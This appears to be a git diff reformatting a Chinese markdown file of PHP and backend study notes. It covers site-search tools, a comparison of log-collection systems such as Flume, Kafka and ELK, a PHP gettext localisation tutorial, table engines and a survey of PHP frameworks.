 还是看你的需求，如果你只是做个站内搜索，google就挺好，如果你要对搜索结果进行控制，那就上面的三种随便选一个，然后深入研究
-f489753		    4
-f489753   2013-09-22 08:09:10 +08:00
+
 目前在用sphinx，不过感觉xunsearch有前途。
+
 当然也可以搞java方案嘛，lucene、slor之类也可以接上。
-felix021		    5
-felix021   2013-09-22 09:49:59 +08:00
+
 小站的话xunsearch就很够用了，文档写得很全啊，有啥问题？
 
 不过xunsearch的速度是硬伤，太慢了，千万级的数据量可能hold不住的感觉。
-F0ur		    6
-F0ur   2013-09-22 10:41:36 +08:00
-@liuxurong v2ex方案是什么
+
 @angelface google搜索还是不能满足需求，可能带有facet功能
+
 @f489753 lucene、slor的话也可以考虑~我再去研究研究
+
 @felix021 我也是觉得小站xunsearch够了，但是是商业站后期数据量肯定会上去的，所以想找个完全的解决方案
-hfcorriez		    7
-hfcorriez   2013-09-22 10:47:53 +08:00   ❤️ 1
+
 可以试试ElasticSearch
-Yuansir		    8
-Yuansir   2013-09-22 13:02:45 +08:00   ❤️ 1
+
 xunsearch 和 sphinx+coreseek 都用过，推荐xunsearch吧，文档齐全，性能不错，功能也强大，坑比较少，比较容易配置和使用
-flyingxu		    9
-flyingxu   2014-09-10 09:56:38 +08:00
-@felix021 速度有多伤？能实现类似stackoverflow提问题时及时搜索类似问题吗？
-
- 
-关于   ·   FAQ   ·   API   ·   我们的愿景   ·   广告投放   ·   感谢   ·   实用小工具   ·   2542 人在线   最高记录 5168   ·      Select Language
-创意工作者们的社区
-World is powered by solitude
-VERSION: 3.9.8.5 · 23ms · UTC 13:38 · PVG 21:38 · LAX 06:38 · JFK 09:38
-♥ Do have faith in what you're doing.
-
-```
 
 ### 各维度监控方案
-```
 https://www.zhihu.com/question/37585246
 
-```
 
 ### 日志收集集中处理方案
-```
 https://www.jianshu.com/p/e3ccb75bd813
+
 随着业务的快速发展，各种服务和组件也要随着增加或扩容，服务器的台数随之增加，这样给日志运维带来很大的问题。如果你要查阅某个项目的日志，服务器数十上百台的话，这将是一件非常繁琐和低效的事。另外，如果你想对这些日志进行实时的分析统计，也无从下手。因此，我们需要一种数据收集框架，它可以将不同服务器上的日志数据，高效地收集汇总在一起，供在线或者离线查阅和分析，并且还可以对系统实施监控和故障告警。
 
 本文档通过介绍Flume NG、Scribe、Kafka、Chukwa和ELK的特点，结构模型，使用时的优势和劣势，以及我们自定义的指标项对比，最后得出它们各自的应用场景，为框架选型提供技术参考。
 
 数据收集系统
+
 Flume NG
+
 Flume NG的介绍
+
 Flume NG 是Cloudera提供的分布式数据收集系统，它能够将不同数据源的海量日志数据进行高效的收集、聚合、移动，最后存储到存储中心。Flume NG支持（故障转移）failover和负载均衡。
 
 Flume NG的结构
+
 Flume NG传输数据的基本单元是event，如果是文件，通常是一行记录。运行的核心是Agent，包含三个核心组件，分别是Source、Channel和Sink，其结构模型图如下：
 
 Flume NG的介绍
+
 Source：接收外部源发送过来的数据，支持Avro、Thrift、JMS、Syslog、Kafka和Http post（自己代码实现）等多种方式的日志接收。提供ExecSource以tail -f等命令的方式实现实时日志收集；提供SpoolSource以读取新增的文件的方式实现低延时的日志收集。
+
 Channel：是一个存储池，接收Source的输出。有MemoryChannel、JDBC Channel、MemoryRecoverChannel和FileChannel等主要类型。其中MemoryChannel可以实现高速吞吐，但无法保证数据的完整性。FileChannel能实现数据的完整性和一致性。Channel中的数据仅会在数据保存在下一个Channel或最终的存储中心时，才会被删除。
+
 Sink：消费Channel中的数据，然后发送给数据存储系统（HDFS、Elasticsearch或者HBase等)。一个Agent可以存在多个Sink，Sink支持负载均衡和failover。
+
 Flume NG的结构图：
+
 多个Agent顺序连接：
 
 最简单的部署方式，通过多个Agent连接，将原始数据传送到下一个Agent或者是最终的存储中心，适合初学者。
 
 多个Agent顺序连接
+
 多个Agent的数据汇聚在同一个Agent中：
+
 多个Agent的数据汇聚在同一个Agent中
+
 最常见的部署方式，比如在各个应用服务器上部署Flume NG，将原始数据同步到一台agent上。
 
 多路Agent连接：
+
 多路Agent连接
+
 包括分流和复制两种方式，分流是根据header信息进行数据的分类存储数据，复制是将数据复制多份。
 
 负载均衡数据模型：
+
 负载均衡数据模型
+
 Agent1负责路由，每个Sink连接一个Agent，Sink支持负载均衡和Failover。
 
 Flume NG的优势劣势
+
 优势：Flume NG通过事务保证数据的完整性和一致性；支持负载均衡；很容易进行水平扩展；社区活跃度高；文档资料比较丰富；依赖第三方库少；部署简单；支持多种存储系统。
+
 劣势：Flume NG需要自己实现客户端代码；ExecSource方式会存在数据丢失的可能，SpoolSource方式做不到监控文件的新增记录；对数据的过滤能力较差。
+
 Scribe
+
 Scribe介绍
+
 Scribe是Facebook开源的一个基于thrift框架的日志收集系统，在facebook内部已经得到大量的应用。Scribe可以从不同数据源，不同机器上收集日志，然后将它们存入存储中心，目前Facebook已停止对Scribe的更新和维护。
 
 Scribe结构
+
 Scribe结构图：
+
 Scribe结构图
+
 Scribe 客户端：需要自己基于Thrift框架实现，每条消息包含一个category和一个message信息，Scribe Server根据category将数据存储在不同的存储系统。
+
 Scribe Server：根据配置，将各个category类型的日志发到不同的存储系统。Scribe Server收集到数据后，将数据放到共享队列，然后Push到存储中心，当存储中心出现故障时，Scribe 会将数据保存在本地文件中，待存储中心恢复后再Push数据。
+
 存储中心：包括HDFS、File和Scribe。
+
 Scribe优势和劣势
+
 优势：具有很高的容错性；支持水平扩展；
+
 劣势：依赖zookeeper或Hash等其他工具；需要自己实现客户端代码；社区活跃度低；文档资料极少；依赖第三方库多；部署较为复杂；存储系统类型较少；数据过滤解析能力差；Facebook公司已停止更新和技术支持。
+
 Kafka
+
 Kafka的介绍
+
 Kafka 是一个基于分布式的消息系统，开发自 LinkedIn ['lɪŋktɪn]，作为 LinkedIn 的活动流和运营数据处理管道。活动流数据包括页面访问量、被查看内容方面的信息以及搜索情况等。运营数据指服务器的性能数据，包括CPU、IO使用率、请求时间、服务日志等。
 
 Kafka结构模型：
+
 Kafka结构模型
+
 Producer：消息发送者，负责发送消息给Broker。
+
 Kafka Cluster：由多个Kafka实例组成，每个实例（Server）成为Broker。集群的搭建依赖Zookeeper。
+
 Consumer：消息消费者，从Kafka读取消息。
+
 Topic：一类消息，类似Queue的概念，Topic在物理上是分节点存储。
+
 Consumer Group：实现一个Topic消息单播和广播的一个手段。要实现广播，只要每个consumer有一个独立的Group就可以。要实现单播，只要所有的Consumer在同一个Group里即可。
+
 Kafka的优势和劣势
+
 Kafka 通过系统解耦、Partition（分片存储）、复制备份、持久化、缓存、集群和异步通信等策略提供了一个高性能、高可靠、可扩展的数据管道和消息系统。
 
 优势：高性能；高可靠；通过Kafka Conenector对接HDFS、Elasticsearch、JDBC等其它系统；支持水平扩展；社区活跃度高；文档资料丰富；依赖第三方库较少。
+
 劣势：依赖Zookeeper；需要自己实现客户端代码；数据过滤解析能力差。
+
 Chukwa
+
 Chukwa的介绍
+
 chukwa 是一个用于监控大型分布式系统的数据收集系统，构建在 Hadoop 的 HDFS 和 map/reduce 框架之上的，继承了 hadoop 的扩展性和健壮性，还包含HICC，可用于展示、监控和分析已收集的数据。
 
 Chukwa的结构
-image.png
+
 Agent：负责采集数据，并发送给Collector。agent采用“watchdog”的机制，自动重启终止的数据采集进程，防止数据丢失。
+
 Adaptor：直接采集数据的接口和工具，支持命令行，log文件和httpSender输出,可以按自己的需求实现Adaptor，一个Agent可以管理多个Adaptor的数据采集。
+
 Collectors：负责收集Agents发送过来的数据，并定时写入集群。
+
 Map/Reduce jobs：定时启动，在此阶段，Chukwa提供了demux [dɪm'ju:ks]和archive [ˈɑ:kaɪv]两种内置的作业类型，其中，demux作为负责对数据分类、排序、去重，archive作业负责把同类型的数据合并。
+
 HICC：负责数据的展示。
+
 Chukwa的优势和劣势
+
 优势：高可靠，易扩展；社区活跃度较高；文档资料较丰富；
+
 劣势：依赖hadoop。
+
 ELK
+
 ELK的介绍
+
 ELK 不是一款软件，而是Elasticsearch、Logstash和Kibana首字母的缩写。这三者是开源软件，通常配合一起使用，而且先后归于Elasic.co公司的名下，所以简称ELK Stack。根据Google Trend的信息显示，ELK已经成为目前最流行的的集中式日志解决方案。
 
 Elasticsearch：是一个分布式搜索和分析引擎，具有高可伸缩、高可靠和易管理等特点。基于Apache Lucene构建，能对大容量的数据进行接近实时的存储、搜索和分析操作。通过简单的配置，Elasticsearch就会帮你管理集群、分片、故障转移、主节点选举等，还提供集群状态的监控接口。
@@ -16742,117 +16725,164 @@ Kibana：数据分析和可视化平台。通常与Elasticsearch配合使用，�
 Filebeat：ELK协议栈的新成员，一个轻量级开源日志文件数据搜集器。我们在需要采集日志数据的服务器上安装Filebeat，并指定日志目录或日志文件后，Filebeat就能读取数据，迅速发送到Logstash进行解析，亦或直接发送到Elasticsearch进行集中式存储和分析。FileBeat可以监听指定目录下是否新增文件，监听文件是否新增记录，文件在一定时间内没更新取消监听，支持批量数据传送，支持负载均衡的方式传送数据到Logstash或Elasticsearch。支持SSL/TLS协议传送。
 
 ELK的结构
+
 最简单的结构模型：
+
 最简单的结构模型
+
 这种结构很简单，适合初学者。初学者可以搭建此结构，了解ELK如何工作。
 
 Logstash作为日志收集器：
+
 Logstash作为日志收集器
+
 这种结构模型需要在各个应用服务器上部署Logstash，但Logstash比较消耗CPU和内存资源，所以比较适合资源丰富的服务器，否则可能会导致应用服务器无法工作。
 
 Beats作为日志收集器，Beats包括四种：
+
 Packetbeat(搜集网络流量数据)
+
 Topbeat(搜集系统、进程、文件系统级别的CPU和内存使用情况等数据)
+
 Filebeat(收集文件数据)
+
 Winlogbeat(收集Window时间日志数据)
+
 Beats作为日志收集器
+
 这种结构解决了Logstash在各服务器节点上占用资源高的问题。另外，数据格式规范的情况下，可以移出Logstash节点,Beats直接发送数据到Elasticsearch，解决Logstash占用资源高的问题。
 
 引入消息队列机制
+
 引入消息队列机制
+
 这种结构适合日志规模比较大的情况。引入消息队列，将上下游服务解耦，减轻下游服务的压力，解决在巨量日志下，网络阻塞延迟、数据丢失的问题，使得网络传输更稳定、更高效，避免级联效应。在巨量日志的情况下，Logstash节点和Elasticsearch节点负荷比较重，可将它们配置成集群模式，分担负荷。在日志比较规范的情况下，可以去掉Logstash,Beats直接发送数据到Elasticsearch，解决Logstash占用资源高的问题。
 
 ELK的优势和劣势
+
 优势：提供一套完整的日志收集、分析、存储和数据展示的解决方案；Logstash支持集群部署和水平扩展；Elasticsearch高可用，支持集群部署和水平扩展；社区活跃度高；文档资料较丰富；部署简单。
+
 劣势：Logstash占用资源比较高。
+
 指标项对比
+
 指标项对比
+
 结论
-结论
+
 ELK告警策略
-ELK告警策略
+
 参考资料
+
 Flume NG
+
 http://blog.csdn.net/zhaodedong/article/details/52541688
+
 http://www.gegugu.com/2016/04/11/5484.html
 
 Scribe
+
 http://www.itdadao.com/articles/c15a502872p0.html
+
 http://www.36dsj.com/archives/66047
 
 Kafka
+
 http://www.cnblogs.com/likehua/p/3999538.html
+
 http://www.infoq.com/cn/articles/kafka-analysis-part-1
 
 Chukwa
+
 http://www.it165.net/admin/html/201403/2507.html
+
 http://f.dataguru.cn/thread-97612-1-1.html
 
 ELK Stack 中文指南
+
 http://kibana.logstash.es/content/
 
 Logstash最佳实践
+
 http://udn.yyuap.com/doc/logstash-best-practice-cn/index.html
 
 Elasticsearch 权威指南
+
 https://es.xiaoleilu.com/
 
 Elasticsearche配置：
+
 https://my.oschina.net/topeagle/blog/405149
+
 https://my.oschina.net/Yumikio/blog/805877
 
 Filebeat配置：
+
 http://m.blog.csdn.net/article/details?id=53584173
+
 http://michaelkang.blog.51cto.com/1553154/1864225
 
 Search Guard:
+
 https://github.com/floragunncom/search-guard-docs
+
 http://www.cnblogs.com/Orgliny/p/6168986.html
+
 http://kibana.logstash.es/content/elasticsearch/auth/searchguard-2.html
 
-```
-
 ### 国际化
-```
-php程序的国际化实现方法（利用gettext）
- 更新时间：2011年08月14日 13:11:59   转载 作者：  
-这里我们主要介绍window平台下使用php的扩展gettext实现程序的国际化。
 
+php程序的国际化实现方法（利用gettext）
+
+这里我们主要介绍window平台下使用php的扩展gettext实现程序的国际化。
  
 步骤一：搭建环境
-1，首先查看你的php扩展目录下是否有php_gettext.dll这个文件，如果没有，这就需要你
-下载一个或是从其他地方拷贝一个，然后放到php扩展目录。
-2，打开php.ini，查找”;extension=php_gettext.dll“ ，然后去除注释，重启apache。
-步骤二:原理讲解
-假如你的没有国际化的程序里有这样的代码，echo "你好";,而国际化的程序你要写成
-echo gettext("你好");，然后再在配置文件里添加“你好”相对应的英文“Hi”。
-这时，中国地区浏览都会在屏幕上输出“你好”，而美国地区浏览都会在屏幕上输出
-“Hi”。也就是说，最终显示什么是根据你的配置文件而定的，如果找不到配置文件，
-才会输出程序里面的内容。
-步骤三：编码测试
-1，我们在d:\www下面新建文件hi.php，详细代码如下
-复制代码代码如下:
 
+1，首先查看你的php扩展目录下是否有php_gettext.dll这个文件，如果没有，这就需要你下载一个或是从其他地方拷贝一个，然后放到php扩展目录。
+
+2，打开php.ini，查找”;extension=php_gettext.dll“ ，然后去除注释，重启apache。
+
+步骤二:原理讲解
+
+假如你的没有国际化的程序里有这样的代码，echo "你好";,而国际化的程序你要写成
+
+echo gettext("你好");，然后再在配置文件里添加“你好”相对应的英文“Hi”。
+
+这时，中国地区浏览都会在屏幕上输出“你好”，而美国地区浏览都会在屏幕上输出
+
+“Hi”。也就是说，最终显示什么是根据你的配置文件而定的，如果找不到配置文件，
+
+才会输出程序里面的内容。
+
+步骤三：编码测试
+
+1，我们在d:\www下面新建文件hi.php，详细代码如下
+
+复制代码代码如下:
+```
 <?php
 $domain = 'test';
 bindtextdomain($domain, "locale/");//设置某个域的mo文件路径
 textdomain($domain);//设置gettext()函数从哪个域去找mo文件
 echo gettext("Hi!");//_()是gettext()函数的简写形式
 ?>
+```
+这时你运行改程序，只会输出“Hi”。但我们是中国人，我们不认识“Hi”， 我们只认识“你好”，这时就要配置文件出马。配置文件的生成一般借助一款工具。
 
-
-这时你运行改程序，只会输出“Hi”。但我们是中国人，我们不认识“Hi”，
-我们只认识“你好”，这时就要配置文件出马。配置文件的生成一般借助一款工具。
 下载地址：http://nchc.dl.sourceforge.net/sourceforge/gnuwin32/gettext-0.14.4.exe
-安装好以后，为了在任意目录里使用，需要把“安装路径/bin”添加到系统环境变量里。
-步骤四：配置文件的生成
-1，我们假设你的工具已经安装好，并且可以在任意目录使用。现在就要运行cmd，并把
-路径切换到d:\www下面，也就是hi.php所在目录。
-键入xgettext -d hi hi.php --from-code=gb2312，然后执行，这时你可以看到新生成一个
-hi.po文件，注意：--from-code=gb2312，其中gb2312还可以是utf-8。
-2，打开hi.po文件，显示如下：
-复制代码代码如下:
 
+安装好以后，为了在任意目录里使用，需要把“安装路径/bin”添加到系统环境变量里。
+
+步骤四：配置文件的生成
+
+1，我们假设你的工具已经安装好，并且可以在任意目录使用。现在就要运行cmd，并把路径切换到d:\www下面，也就是hi.php所在目录。
+
+键入xgettext -d hi hi.php --from-code=gb2312，然后执行，这时你可以看到新生成一个 hi.po文件，注意：--from-code=gb2312，其中gb2312还可以是utf-8。
+
+2，打开hi.po文件，显示如下：
+
+复制代码代码如下:
+```
 # SOME DESCRIPTIVE TITLE.
 # Copyright (C) YEAR THE PACKAGE'S COPYRIGHT HOLDER
 # This file is distributed under the same license as the PACKAGE package.
@@ -16881,20 +16911,27 @@ msgstr ""
 3，键入msgfmt -o hi.mo hi.po，执行，这时生成hi.mo文件。
 然后在d:\www下新建locale\zh_Cn\LC_MESSAGES目录，把hi.mo拷到这里就行了。
 4，现在重启apache，再次运行，屏幕上可以输出“你好”。
-其他：
-如果使用utft-8编码的话，需要使用
-bind_textdomain_codeset($domain,'UTF-8');
-相应的要把hi.po里的CHARSET改成utf-8，还需要把hi.po保存成utf-8格式，
-再次生成hi.mo就行了。
-总结：
-我们都希望我们写的程序可以被大众甚至国际普遍使用，像大名鼎鼎的wordpress的
-国际化使用的也是他。gettext还是非常不错的，简单易用，
-https://www.jb51.net/article/28000.htm
 ```
+其他：
+
+如果使用utft-8编码的话，需要使用
+```
+bind_textdomain_codeset($domain,'UTF-8');
+```
+相应的要把hi.po里的CHARSET改成utf-8，还需要把hi.po保存成utf-8格式， 再次生成hi.mo就行了。
+
+总结：
+
+我们都希望我们写的程序可以被大众甚至国际普遍使用，像大名鼎鼎的wordpress的
+
+国际化使用的也是他。gettext还是非常不错的，简单易用，
+
+https://www.jb51.net/article/28000.htm
 
 ### 数据库设计
-```
+
 https://www.cnblogs.com/xuemj/articles/6999574.html
+
 什么是表引擎
 
 我们看到的表结构，它的本质是数据在硬盘中的存储。根据不同的特性，数据的存储方式不同。比如：对于每一条数据，在硬盘中它是怎么存储的，怎么压缩的，怎么建立索引和优化的，它的读取和写入是怎么实现的。这些完整的一条路径，我们称之为表引擎。
@@ -17039,31 +17076,23 @@ D：我们的留言板有点像实时聊天器，对性能要求和实时性要�
 
 其它情况，可以根据实际场景选择
 
-```
-
 ### 静态化如何实现的
 https://blog.csdn.net/qq_39618306/article/details/79014438
-```
-这里要说的静态化指的是页面静态化，也即生成实实在在的静态文件，
-也即不需要查询数据库就可以直接从文件中获取数据，
-指的是真静态。它的实现方式主要有两种：
-一种是我们在添加信息入库的时候就生成的静态文件，也称为模板替换技术，
-这种主要用在后台，用于一些基本上很少变化的信息上，
-在添加信息的时候使用添加的信息来替换制定好的模板中的内容，
-达到生成静态文件的目的，这样在前台访问该信息时，
-可以直接从生成好的静态文件中获取信息，如一些CMS系统。
-另外一种是用户在访问我们的页面时先判断是否有对应的缓存文件存在，
-如果存在就读缓存，不存在就读数据库，同时生成缓存文件。
-这种实现的主要原理是基于PHP中的ob缓冲技术来实现的，
-当没有静态文件时，从数据库中读取，读取的数据使用OB缓存，
-使用相关的函数从OB缓冲中读取数据，写入到文件中，形成静态文件。
-当然这个过程中要考虑静态文件的缓存周期问题，
-我们可以根据文件的最后修改时间和当前时间及设定的缓存时间来定时更新缓存文件。
-```
+
+这里要说的静态化指的是页面静态化，也即生成实实在在的静态文件， 也即不需要查询数据库就可以直接从文件中获取数据， 指的是真静态。它的实现方式主要有两种：
+
+一种是我们在添加信息入库的时候就生成的静态文件，也称为模板替换技术， 这种主要用在后台，用于一些基本上很少变化的信息上， 在添加信息的时候使用添加的信息来替换制定好的模板中的内容， 达到生成静态文件的目的，这样在前台访问该信息时， 可以直接从生成好的静态文件中获取信息，如一些CMS系统。
+
+另外一种是用户在访问我们的页面时先判断是否有对应的缓存文件存在， 如果存在就读缓存，不存在就读数据库，同时生成缓存文件。
+
+这种实现的主要原理是基于PHP中的ob缓冲技术来实现的， 当没有静态文件时，从数据库中读取，读取的数据使用OB缓存， 使用相关的函数从OB缓冲中读取数据，写入到文件中，形成静态文件。
+
+当然这个过程中要考虑静态文件的缓存周期问题， 我们可以根据文件的最后修改时间和当前时间及设定的缓存时间来定时更新缓存文件。
 
 ### 画出常见 PHP 应用架构图
-```
+
 https://www.sohu.com/a/321617933_100240362
+
 PHP作为网络开发的强大语言之一,现在应用非常广泛，具有开放源代码，跨平台性强，开发快捷，效率高，面向对象，并且易于上手，专业专注等诸多优点。
 
 因着这些强大的性能，PHP一度被称为“最好的语言”。PHP主要是用于WEB开发，所以各种PHP开发框架显得极为重要，它们使得程序开发变的简单有效。
@@ -17075,8 +17104,6 @@ PHP作为网络开发的强大语言之一,现在应用非常广泛，具有开�
 2、Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。
 
 Yii是一个高性能的PHP5的web应用程序开发框架。通过一个简单的命令行PHP框架工具 yiic 可以快速创建一个web应用程序的代码框架，开发者可以在生成的代码框架基础上添加业务逻辑，以快速完成应用程序的开发。
-
-
 
 3、KYPHP支持多数据库，多语言，多模版，多app,多缓存，多编码格式，模板布局，自定义类，自动加载公共类库。
 
@@ -17095,435 +17122,461 @@ KYPHP已应用于许多大项目中，在同一程式中可同时管理多个数
 根据实际开发总结汇成快捷方便的轻量级框架。没有太多的硬性要求，也没有一本超厚的帮助手册。快速开发、部署、学习必备利器。
 
 PHP作为一种服务器端的脚本语言，一般用来做网站，而PHP框架让开发变得简单起来，上述6种框架仅仅只是部分框架，六星教育选取了几个具有代表性的框架单独进行描述，希望能给正在学习PHP的同学们一些帮助。
-```
 
 ## 框架篇
 ### ThinkPHP（TP）、CodeIgniter（CI）、Zend（非 OOP 系列）
-```
 http://www.sjzphp.com/webdis/php_framwork_828.html
+
 php框架这几个一定要知道
-发布时间:2019-04-08 18:23:31 来源:互联网 作者:青锋建站
-　　php框架就是采用一定设计理念和架构将PHP开发组件进行封闭，并按照软件开发的过程来组织php框架结构，形成的PHP代码集。应用PHP框架进行项目开发，可以大幅度节省开发时间，统一人员合作，减少由于开发水平不统一带来的安全问题。一般PHP项目开发框架集成了这些功能：缓存，表单过滤，MVC架构，统一的数据库接口，请求分发等功能。以下是青锋建站给大家总结的最常用的几个PHP开发框架，各自有各自的特点，需要根据我们的需求来使用。青锋建站，专业致力于PHP网站建设，软件开发，SEO，网络营销，CMS建站二开发。
+
+php框架就是采用一定设计理念和架构将PHP开发组件进行封闭，并按照软件开发的过程来组织php框架结构，形成的PHP代码集。应用PHP框架进行项目开发，可以大幅度节省开发时间，统一人员合作，减少由于开发水平不统一带来的安全问题。一般PHP项目开发框架集成了这些功能：缓存，表单过滤，MVC架构，统一的数据库接口，请求分发等功能。以下是青锋建站给大家总结的最常用的几个PHP开发框架，各自有各自的特点，需要根据我们的需求来使用。青锋建站，专业致力于PHP网站建设，软件开发，SEO，网络营销，CMS建站二开发。
 
 1、zendframwork
-　　zendframwork: (ZF)是Zend公司推出的一套PHP开发框架，是PHP官方开发框架，是框架界的龙头老大。功能非常的强大，是一个重量级的框架，ZF 用 100% 面向对象编码实现。 ZF 的组件结构独一无二，每个组件几乎不依靠其他组件。这样的松耦合结构可以让开发者独立使用组件。 但是由于太庞大，如果是开发小型项目，降低速度性能。
+
+zendframwork: (ZF)是Zend公司推出的一套PHP开发框架，是PHP官方开发框架，是框架界的龙头老大。功能非常的强大，是一个重量级的框架，ZF 用 100% 面向对象编码实现。 ZF 的组件结构独一无二，每个组件几乎不依靠其他组件。这样的松耦合结构可以让开发者独立使用组件。 但是由于太庞大，如果是开发小型项目，降低速度性能。
 
 2、Yii框架
-　　Yii框架由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。Yii是一个高性能的PHP5的web应用程序开发框架。通过一个简单的命令行PHP框架工具 yiic 可以快速创建一个web应用程序的代码框架，开发者可以在生成的代码框架基础上添加业务逻辑，以快速完成应用程序的开发。
+
+Yii框架由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。Yii是一个高性能的PHP5的web应用程序开发框架。通过一个简单的命令行PHP框架工具 yiic 可以快速创建一个web应用程序的代码框架，开发者可以在生成的代码框架基础上添加业务逻辑，以快速完成应用程序的开发。
 
 3、TP5框架
-　　之所以把TP5框架放在这个位置，主要是现在国内使用太普遍了，正是由于提供了全面的中文文档支持，才拥有了大量的使用群。ThinkPHP是一个快速、简单、面向对象的轻量级PHP开发框架。遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。
+
+之所以把TP5框架放在这个位置，主要是现在国内使用太普遍了，正是由于提供了全面的中文文档支持，才拥有了大量的使用群。ThinkPHP是一个快速、简单、面向对象的轻量级PHP开发框架。遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。
 
 4.Symfony框架
-　　Symfony，是一套国外的PHP开源框架。简单的模板功能symfony是一个开源的PHP Web框架。基于最佳Web开发实践，已经有多个网站完全采用此框架开发，symfony的目的是加速Web应用的创建与维护。 它的特点如下：缓存管理 、自定义URLs、搭建了一些基础模块、多语言与I18N支持、采用对象模型与MVC分离、Ajax支持、适用于企业应用开发。
+
+Symfony，是一套国外的PHP开源框架。简单的模板功能symfony是一个开源的PHP Web框架。基于最佳Web开发实践，已经有多个网站完全采用此框架开发，symfony的目的是加速Web应用的创建与维护。 它的特点如下：缓存管理 、自定义URLs、搭建了一些基础模块、多语言与I18N支持、采用对象模型与MVC分离、Ajax支持、适用于企业应用开发。
 
 5、CodeIgniter（CI）框架
-　　CodeIgniter 是一个简单快速的PHP MVC 框架。它为组织提供了足够的自由支持，允许开发人员更迅速地工作。使用 CodeIgniter 时，您不必以某种方式命名数据库表，也不必根据表命名模型。这使 CodeIgniter 成为重构遗留 PHP 应用程序的理想选择，在此类遗留应用程序中，可能存在需要移植的所有奇怪的结构。
+
+CodeIgniter 是一个简单快速的PHP MVC 框架。它为组织提供了足够的自由支持，允许开发人员更迅速地工作。使用 CodeIgniter 时，您不必以某种方式命名数据库表，也不必根据表命名模型。这使 CodeIgniter 成为重构遗留 PHP 应用程序的理想选择，在此类遗留应用程序中，可能存在需要移植的所有奇怪的结构。
 
 6、CanPHP框架
-　　CanPHP框架是一个简洁，实用，高效，遵循apache协议的php开源框架。它既可以完美的支持MVC模式，又可以不受限制的支持传统编程模式。它是一个轻量级的php框架，同时也是一个实用的php工具 包。以面向应用为主，不纠结于OOP，不纠结于MVC，不纠结于设计模式，不拘一格，力求简单快速优质的完成项目开发，是中小型项目开发首选。
+
+CanPHP框架是一个简洁，实用，高效，遵循apache协议的php开源框架。它既可以完美的支持MVC模式，又可以不受限制的支持传统编程模式。它是一个轻量级的php框架，同时也是一个实用的php工具 包。以面向应用为主，不纠结于OOP，不纠结于MVC，不纠结于设计模式，不拘一格，力求简单快速优质的完成项目开发，是中小型项目开发首选。
 
 7、Laravel 简单优雅框架
-　　Laravel 是一个简单优雅的 PHP web 开发框架，将你从意大利面条式的代码中解放出来。通过简单的、表达式语法开发出很棒的 Web 应用。在Laravel中已经具有了一套高级的PHP ActiveRecord实现 -- Eloquent ORM。它能方便的将“约束（constraints）”应用到关系的双方，这样你就具有了对数据的完全控制，而且享受到ActiveRecord的所有便利。Eloquent原生支持Fluent中查询构造器（query-builder）的所有方法。
+
+Laravel 是一个简单优雅的 PHP web 开发框架，将你从意大利面条式的代码中解放出来。通过简单的、表达式语法开发出很棒的 Web 应用。在Laravel中已经具有了一套高级的PHP ActiveRecord实现 -- Eloquent ORM。它能方便的将“约束（constraints）”应用到关系的双方，这样你就具有了对数据的完全控制，而且享受到ActiveRecord的所有便利。Eloquent原生支持Fluent中查询构造器（query-builder）的所有方法。
 
 8、SlimFramework框架
-　　SlimFramework是一个简单的 PHP5 框架用来创建 RESTful 的 Web 应用。可以帮助你快速编写简单功能强大的 RESTful 风格的web应用程序 和APIs。Slim很简单，可以让新手和专业人士使用。
 
- 
+SlimFramework是一个简单的 PHP5 框架用来创建 RESTful 的 Web 应用。可以帮助你快速编写简单功能强大的 RESTful 风格的web应用程序 和APIs。Slim很简单，可以让新手和专业人士使用。
 
 9、CakePHP框架.
-　　CakePHP是国外的框架，是一个运用了诸如ActiveRecord、Association Data Mapping、Front Controller和MVC等著名设计模式的快速开发框架。
+
+CakePHP是国外的框架，是一个运用了诸如ActiveRecord、Association Data Mapping、Front Controller和MVC等著名设计模式的快速开发框架。
 该项目主要目标是提供一个可以让各种层次的PHP开发人员快速地开发出健壮的Web应用，而又不失灵活性
 
 10、PHPUnit框架
-　　PHPUnit是一个轻量级的PHP测试框架。它是在PHP5下面对JUnit3系列版本的完整移植。这个工具也可以被Xdebug扩展用来生成代码覆盖率报告 ，并且可以与phing集成来自动测试，最合它还可以和Selenium整合来完成大型的自动化集成测试。
+
+PHPUnit是一个轻量级的PHP测试框架。它是在PHP5下面对JUnit3系列版本的完整移植。这个工具也可以被Xdebug扩展用来生成代码覆盖率报告 ，并且可以与phing集成来自动测试，最合它还可以和Selenium整合来完成大型的自动化集成测试。
 
 11、KYPHP框架
-　　KYPHP支持多数据库，多语言，多模版，多app,多缓存，多编码格式，模板布局，自定义类，自动加载公共类库。KYPHP已应用于许多大项目中，在同一程式中可同时管理多个数据库源，管理多个缓存，并支持复杂的目录结构。从2.1开始kyphp又极大的增强了安全性，可有效防止sql注入，xss等常见安全问题。
+
+KYPHP支持多数据库，多语言，多模版，多app,多缓存，多编码格式，模板布局，自定义类，自动加载公共类库。KYPHP已应用于许多大项目中，在同一程式中可同时管理多个数据库源，管理多个缓存，并支持复杂的目录结构。从2.1开始kyphp又极大的增强了安全性，可有效防止sql注入，xss等常见安全问题。
 
 12、initPHP框架
-　　initPHP是一款轻量级的php开发框架。采用分层体系架构，适合大中型网站架构。提供丰富的library类库，以及简单的框架扩展机制，InitPHP还提供详细的开发文档，可以让您在使用该框架的时候更加简单实用。 InitPHP实现了抽象DB层、分层体系架构、缓存无缝切换机制、简单模板机制、多模型部署机制、强大的安全体系，是快速开发php应用的利器。
+
+initPHP是一款轻量级的php开发框架。采用分层体系架构，适合大中型网站架构。提供丰富的library类库，以及简单的框架扩展机制，InitPHP还提供详细的开发文档，可以让您在使用该框架的时候更加简单实用。 InitPHP实现了抽象DB层、分层体系架构、缓存无缝切换机制、简单模板机制、多模型部署机制、强大的安全体系，是快速开发php应用的利器。
 
 13、SpeedPHP框架
-　　SpeedPHP是一款全功能的国产PHP应用框架系统。SpeedPHP框架是从实际运行的商业系统中取其精华而成的，在稳定性和运行速度上都非常出色；同时有着清晰的架构，更有利于提高团队开发效率，教程众多，入门容易，号称最适合初学者的PHP框架，快速带你进入PHP高手的行列。
